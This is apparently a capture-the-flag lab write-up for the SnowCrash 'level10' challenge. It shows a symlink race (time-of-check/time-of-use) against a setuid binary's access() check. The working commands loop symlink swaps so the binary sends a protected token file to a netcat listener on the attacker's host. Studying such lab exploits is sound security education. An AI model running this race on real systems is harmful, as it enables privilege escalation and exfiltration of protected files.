# level10

We are greeted with two files.  
An _setuid_ executable called `level10` belonging to `flag10`, and executable as this user for everyone in the `level10` group;  
And a `token` file that is only readable and writable by user `flag10`.

The executable takes a path to a file and a network address, and will connect to this address on port 6969 (crudely, given how many times the connection needs to be retried) and output the content of the file there.

On the host computer, assuming the VM is connected to a host-only network on range 192.168.56.1, we run
```sh
nc -l 6969
```

On the VM, let's run
```sh
echo hello > /tmp/hello
./level10 hello 192.168.56.1
```

And we see on our host
```
.*( )*.
hello
```

So since user `flag10` has access to the `token` file and `level10` runs as `flag10`, that should be easy, right?  
Well...
```sh
level10@SnowCrash:~$ ./level10 token 192.168.56.1
You don't have access to token
```
But how?  
There has to be supplemental access control!

Indeed, running `nm level10` reveals that the program is using the `access` function from the libc, which is used to check whether the setuid process' _real_ UID/GID can access a file and preventing us from doing what we want to do.  
However, the man page has something tasty for us.
```
Warning: Using these calls to check if a user is authorized to,
       for example, open a file before actually doing so using open(2)
       creates a security hole, because the user might exploit the short
       time interval between checking and opening the file to manipulate
       it.  For this reason, the use of this system call should be
       avoided.  (In the example just described, a safer alternative
       would be to temporarily switch the process's effective user ID to
       the real ID and then call open(2).)
```

# Resolution

The idea will be to have a naughty _symlimk_ which will point to a file we can access as our regular user, have the program run its `access` call on this harmless file, and then replace the symlink with one that points to our token just before the program attemps to open and print it.

In such a scenario, timing is of the essence and it will be extremely hard to accomplish in a predictable and curated way, so we will be using the dirty but effective method of _making the two things run very quickly on repeat until things eventually click together in order_.

On our host
```sh
nc -lk 6969
```
On our VM, in one terminal
```sh
echo hello > /tmp/hello
while true; do ln -fs /tmp/hello /tmp/symlink; ln -fs ~/token /tmp/symlink; done
```
In another
```sh
while true; do ./level10 /tmp/symlink 192.168.56.1; done
```

And we eventually get what we want.
